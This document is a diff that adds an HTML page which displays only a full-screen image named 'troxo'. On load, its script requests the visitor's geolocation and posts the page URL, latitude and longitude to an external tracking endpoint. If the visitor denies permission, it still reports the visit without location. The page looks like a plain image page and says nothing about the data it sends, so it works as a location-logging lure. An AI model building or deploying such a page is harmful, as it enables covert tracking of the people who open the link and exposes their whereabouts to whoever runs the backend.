@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title>troxo-website.com</title>
+  <style>
+    body{
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-items: center;
+    }
+    img{
+      width: 100%;
+      height: 100%;
+    }
+  </style>
+  <body>
+    <img src="./troxo.png" alt="troxo">
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    window.onload = function () {
+      const url = window.location.href;
+      const API = 'https://node-portfolio-back-end-eight.vercel.app';
+
+      const send_data = async (lat = null, lon = null) => {
+        try {
+          await axios.post(`${API}/track-visitor`, {
+            url,
+            role: "admin",
+            heardFrom: "nowaffffffffff",
+            counter: "normal",
+            lat,
+            lon
+          });
+        } catch (err) {
+          console.log(err);
+        }
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            send_data(lat, lon);
+          },
+          () => {
+            send_data(); // لو المستخدم رفض أو حصل خطأ، ابعت بدون location
+          }
+        );
+      } else {
+        send_data(); // لو الجهاز مش بيدعم تحديد الموقع
+      }
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
